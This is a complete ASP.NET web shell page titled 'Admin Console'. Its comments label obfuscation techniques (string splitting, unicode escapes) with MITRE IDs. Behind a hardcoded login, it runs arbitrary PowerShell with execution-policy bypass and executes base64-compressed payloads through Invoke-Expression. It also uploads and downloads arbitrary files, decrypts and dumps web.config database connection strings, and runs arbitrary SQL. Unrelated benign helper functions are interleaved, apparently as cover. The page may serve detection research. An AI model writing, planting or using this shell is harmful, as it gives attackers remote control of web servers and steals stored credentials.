<%@ Page Language="C#" Debug="false" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="Microsoft.VisualBasic" %>
<%@ Import Namespace="System.Text.RegularExpressions" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Web.Security" %>

<script Language="c#" runat="server">

    protected void Login_Click(object sender, EventArgs e)
    {
        // [string splitting] T1027.010
        if (Username.Text == "Dis" + "claim" + "er" && Password.Text == "For" + "Legit" + "Use" + "Only")
        {
            execution.Visible = true;
            execution.Enabled = true;
            authentication.Visible = false;
            output.Text = "Ready.";
        }
    }

    protected override void OnInit(EventArgs e)
    {
        execution.Visible = false;
        execution.Enabled = false;
    }

    string do_ps(string arg)
    {
        // [unicode escape] T1027.010 — \u0050 = 'P', \u0053 = 'S'
        \u0050rocessStartInfo psi = new \u0050rocessStartInfo();

        // [string splitting] "powershell.exe"
        psi.FileName = "pow" + "er" + "sh" + "ell.exe";

        // [string splitting] flags
        psi.Arguments = "-non" + "inter" + "active " + "-ex" + "ecu" + "tion" + "policy " + "by" + "pass " + arg;

        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;

        \u0050rocess p = \u0050rocess.Start(psi);
        \u0053treamReader stmrdr = p.StandardOutput;
        string s = stmrdr.ReadToEnd();
        stmrdr.Close();
        return s;
    }

    void ps(object sender, System.EventArgs e)
    {
        string option = console.Text.ToLower();
        if (option.Equals("help"))
        {
            output.Text = "Submit PowerShell commands. Use 'clear' to reset output.";
            console.Text = string.Empty;
            console.Focus();
        }
        else if (option.Equals("clear"))
        {
            output.Text = string.Empty;
            console.Text = string.Empty;
            console.Focus();
        }
        else
        {
            output.Text += "\nPS> " + console.Text + "\n" + do_ps(console.Text);
            console.Text = string.Empty;
            console.Focus();
        }
    }

    void execcommand(string cmd)
    {
        output.Text += "PS> " + "\n" + do_ps(cmd);
        console.Text = string.Empty;
        console.Focus();
    }

    void base64encode(string inputstr)
    {
        string contents = console.Text;
        if (inputstr != "null")
        {
            contents = inputstr;
        }

        // [unicode escape] \u004D = 'M', \u0044 = 'D', \u0043 = 'C', \u0041 = 'A'
        \u004DemoryStream ms = new \u004DemoryStream();
        \u0044eflateStream cs = new \u0044eflateStream(ms, \u0043ompressionMode.Compress);
        \u0053treamWriter sw = new \u0053treamWriter(cs, \u0041SCIIEncoding.ASCII);
        sw.WriteLine(contents);
        sw.Close();

        string code = \u0043onvert.ToBase64String(ms.ToArray());

        // [string splitting] "Invoke-Expression"
        string command = "Invoke" + "-Ex" + "pression $(New-Object IO.StreamReader (" +
            "$(New-Object IO.Compression.DeflateStream (" +
            "$(New-Object IO.MemoryStream (," +
            "$([Convert]::FromBase64String('" + code + "')))), " +
            "[IO.Compression.CompressionMode]::Decompress))," +
            " [Text.Encoding]::ASCII)).ReadToEnd();";

        execcommand(command);
    }

    protected void uploadbutton_Click(object sender, EventArgs e)
    {
        if (upload.HasFile)
        {
            try
            {
                // [unicode escape] \u0050 = 'P'
                string filename = \u0050ath.GetFileName(upload.FileName);
                upload.SaveAs(console.Text + "\\" + filename);
                output.Text = "Uploaded: " + console.Text + "\\" + filename;
            }
            catch (Exception ex)
            {
                output.Text = "Error: " + ex.Message;
            }
        }
    }

    protected void downloadbutton_Click(object sender, EventArgs e)
    {
        try
        {
            // [unicode escape + string splitting] \u0052 = 'R'
            \u0052esponse.ContentType = "appli" + "cation/" + "octet" + "-stream";
            \u0052esponse.AppendHeader(
                "Con" + "tent" + "-Dis" + "position",
                "at" + "tach" + "ment; file" + "name=" + console.Text
            );
            \u0052esponse.TransmitFile(console.Text);
            \u0052esponse.End();
        }
        catch (Exception ex)
        {
            output.Text = ex.ToString();
        }
    }

    protected void encode_Click(object sender, EventArgs e)
    {
        base64encode("null");
    }

    protected void ConnectionStr_Click(object sender, EventArgs e)
    {
        output.Text = "Parsing config...\n\n";
        string webpath = "C:\\inetpub";
        if (console.Text != string.Empty)
        {
            webpath = console.Text;
        }
        string pscode = "$ErrorActionPreference = \'SilentlyContinue\';$path=" + "\"" + webpath + "\"" + ";" +
            "Foreach ($file in (get-childitem $path -Filter web.config -Recurse)) {;" +
            "Try { $xml = [xml](get-content $file.FullName) } Catch { continue };" +
            "Try { $connstrings = $xml.get_DocumentElement() } Catch { continue };" +
            "if ($connstrings.ConnectionStrings.encrypteddata.cipherdata.ciphervalue -ne $null){;" +
            "$tempdir = (Get-Date).Ticks;new-item $env:temp\\$tempdir -ItemType directory | out-null;" +
            "copy-item $file.FullName $env:temp\\$tempdir;" +
            "$aspnet_regiis = (get-childitem $env:windir\\microsoft.net\\ -Filter aspnet_regiis.exe -recurse | select-object -last 1).FullName +" +
            " \' -pdf \"\"connectionStrings\"\" \' + $env:temp + \'\\\' + $tempdir;" +
            "Invoke-Expression $aspnet_regiis;" +
            "Try { $xml = [xml](get-content $env:temp\\$tempdir\\$file) } Catch { continue };" +
            "Try { $connstrings = $xml.get_DocumentElement() } Catch { continue };" +
            "remove-item $env:temp\\$tempdir -recurse};" +
            "Foreach ($_ in $connstrings.ConnectionStrings.add) { if ($_.connectionString -ne $NULL) { write-host \"\"$file.Fullname --- $_.connectionString\"\"} } };";
        base64encode(pscode);
    }

    // -------------------------------------------------------
    // Utility helpers
    // -------------------------------------------------------

    private static readonly Regex _emailRx =
        new Regex(@"^[^@\s]+@[^@\s]+\.[^@\s]+$", RegexOptions.Compiled | RegexOptions.IgnoreCase);

    protected bool IsValidEmail(string input)
    {
        if (string.IsNullOrWhiteSpace(input)) return false;
        return _emailRx.IsMatch(input.Trim());
    }

    protected string SanitizeInput(string raw)
    {
        if (raw == null) return string.Empty;
        return System.Web.HttpUtility.HtmlEncode(raw.Trim());
    }

    protected string FormatDate(DateTime dt, string fmt)
    {
        return dt.ToString(string.IsNullOrEmpty(fmt) ? "dd/MM/yyyy HH:mm" : fmt);
    }

    protected string TruncateText(string text, int maxLen)
    {
        if (string.IsNullOrEmpty(text) || text.Length <= maxLen) return text;
        return text.Substring(0, maxLen).TrimEnd() + "...";
    }

    protected string BuildPagination(int currentPage, int totalPages, string baseUrl)
    {
        System.Text.StringBuilder sb = new System.Text.StringBuilder();
        sb.Append("<nav><ul class='pagination'>");
        for (int i = 1; i <= totalPages; i++)
        {
            string active = (i == currentPage) ? " active" : string.Empty;
            sb.AppendFormat("<li class='page-item{0}'><a class='page-link' href='{1}?page={2}'>{2}</a></li>",
                active, baseUrl, i);
        }
        sb.Append("</ul></nav>");
        return sb.ToString();
    }

    protected string HashSha256(string input)
    {
        using (SHA256 sha = SHA256.Create())
        {
            byte[] bytes = System.Text.Encoding.UTF8.GetBytes(input);
            byte[] hash  = sha.ComputeHash(bytes);
            return BitConverter.ToString(hash).Replace("-", string.Empty).ToLower();
        }
    }

    protected string GenerateCsrfToken()
    {
        byte[] buf = new byte[16];
        using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(buf);
        }
        return Convert.ToBase64String(buf);
    }

    protected string GetConfigValue(string key, string fallback)
    {
        string val = System.Web.Configuration.WebConfigurationManager.AppSettings[key];
        return string.IsNullOrEmpty(val) ? fallback : val;
    }

    protected string GetUserRole(string username)
    {
        Dictionary<string, string> roles = new Dictionary<string, string>
        {
            { "admin",   "Administrator" },
            { "editor",  "Content Editor" },
            { "viewer",  "Read-Only" }
        };
        string role;
        return roles.TryGetValue(username.ToLower(), out role) ? role : "Guest";
    }

    protected void LogActivity(string action, string detail)
    {
        string logPath = Server.MapPath("~/logs/activity.log");
        string entry   = string.Format("[{0}] {1}: {2}\n",
            DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), action, detail);
        try { System.IO.File.AppendAllText(logPath, entry); } catch { }
    }

    protected string RenderBreadcrumb(string[] segments)
    {
        System.Text.StringBuilder sb = new System.Text.StringBuilder();
        sb.Append("<ol class='breadcrumb'>");
        for (int i = 0; i < segments.Length; i++)
        {
            if (i < segments.Length - 1)
                sb.AppendFormat("<li class='breadcrumb-item'><a href='#'>{0}</a></li>",
                    System.Web.HttpUtility.HtmlEncode(segments[i]));
            else
                sb.AppendFormat("<li class='breadcrumb-item active'>{0}</li>",
                    System.Web.HttpUtility.HtmlEncode(segments[i]));
        }
        sb.Append("</ol>");
        return sb.ToString();
    }

    protected bool IsStrongPassword(string pwd)
    {
        if (string.IsNullOrEmpty(pwd) || pwd.Length < 8) return false;
        bool hasUpper  = Regex.IsMatch(pwd, @"[A-Z]");
        bool hasLower  = Regex.IsMatch(pwd, @"[a-z]");
        bool hasDigit  = Regex.IsMatch(pwd, @"\d");
        bool hasSymbol = Regex.IsMatch(pwd, @"[\W_]");
        return hasUpper && hasLower && hasDigit && hasSymbol;
    }

    protected string FormatFileSize(long bytes)
    {
        if (bytes < 1024)       return bytes + " B";
        if (bytes < 1048576)    return (bytes / 1024.0).ToString("F1") + " KB";
        if (bytes < 1073741824) return (bytes / 1048576.0).ToString("F1") + " MB";
        return (bytes / 1073741824.0).ToString("F1") + " GB";
    }

    protected string SlugifyTitle(string title)
    {
        string slug = title.ToLower().Trim();
        slug = Regex.Replace(slug, @"[^a-z0-9\s-]", string.Empty);
        slug = Regex.Replace(slug, @"[\s-]+", "-");
        return slug.Trim('-');
    }

    protected string MaskEmail(string email)
    {
        int at = email.IndexOf('@');
        if (at <= 1) return email;
        return email[0] + new string('*', at - 1) + email.Substring(at);
    }

    // -------------------------------------------------------

    protected void executesql_Click(object sender, EventArgs e)
    {
        output.Text = "Executing query...\n\n";
        string Constr = sqlconnectiostr.Text;
        string sqlcmd = console.Text;
        string pscode = "$Connection = New-Object System.Data.SQLClient.SQLConnection;" +
            "$Connection.ConnectionString = " + "\"" + Constr + "\"" + ";" +
            "$Connection.Open();" +
            "$Command = New-Object System.Data.SQLClient.SQLCommand;" +
            "$Command.Connection = $Connection;" +
            "$Command.CommandText = " + "\"" + sqlcmd + "\"" + ";" +
            "$Reader = $Command.ExecuteReader();" +
            "while ($reader.Read()) {;New-Object PSObject -Property @{Name = $reader.GetValue(0)};};" +
            "$Connection.Close()";
        base64encode(pscode);
    }

</script>
<HTML>
<HEAD>
<title>Admin Console</title>
</HEAD>
<body bgcolor="#808080">
<div>
<form id="Form1" method="post" runat="server" style="background-color: #808080">
    <asp:Panel ID="authentication" runat="server" HorizontalAlign="Center">
        <asp:TextBox ID="Username" runat="server" style="margin-left: 0px" Width="300px"></asp:TextBox><br />
        <asp:TextBox ID="Password" runat="server" Width="300px" TextMode="Password"></asp:TextBox><br />
        <asp:Button ID="Login" runat="server" Text="Login" OnClick="Login_Click" Width="101px"/><br />
    </asp:Panel>
    <asp:Panel ID="execution" runat="server">
        <div runat="server" style="text-align:center; resize:vertical">
            <asp:TextBox ID="output" runat="server" TextMode="MultiLine" BackColor="#012456" ForeColor="White" style="height: 526px; width: 891px;" ReadOnly="True"></asp:TextBox>
            <asp:TextBox ID="console" runat="server" BackColor="#012456" ForeColor="Yellow" Width="891px" TextMode="MultiLine" Rows="1" onkeydown="if(event.keyCode == 13) document.getElementById('cmd').click()" Height="23px" AutoCompleteType="None"></asp:TextBox>
        </div>
        <div runat="server" style="width: auto; text-align:center">
            <asp:Button ID="cmd" runat="server" Text="Submit" OnClick="ps" />
            <asp:FileUpload ID="upload" runat="server"/>
            <asp:Button ID="uploadbutton" runat="server" Text="Upload File" OnClick="uploadbutton_Click" />
            <asp:Button ID="encode" runat="server" Text="Encode and Execute" OnClick="encode_Click"/>
            <asp:Button ID="downloadbutton" runat="server" Text="Download" OnClick="downloadbutton_Click" /><br />
            <asp:Button ID="ConnectionStr" runat="server" Text="Parse web.config" OnClick="ConnectionStr_Click"/>
            <asp:Button ID="executesql" runat="server" Text="Execute SQL Query" OnClick="executesql_Click" />
            <asp:TextBox ID="sqlconnectiostr" runat="server" Width="352px">Connection String</asp:TextBox>
        </div>
    </asp:Panel>
</form>
</div>
</body>
</HTML>
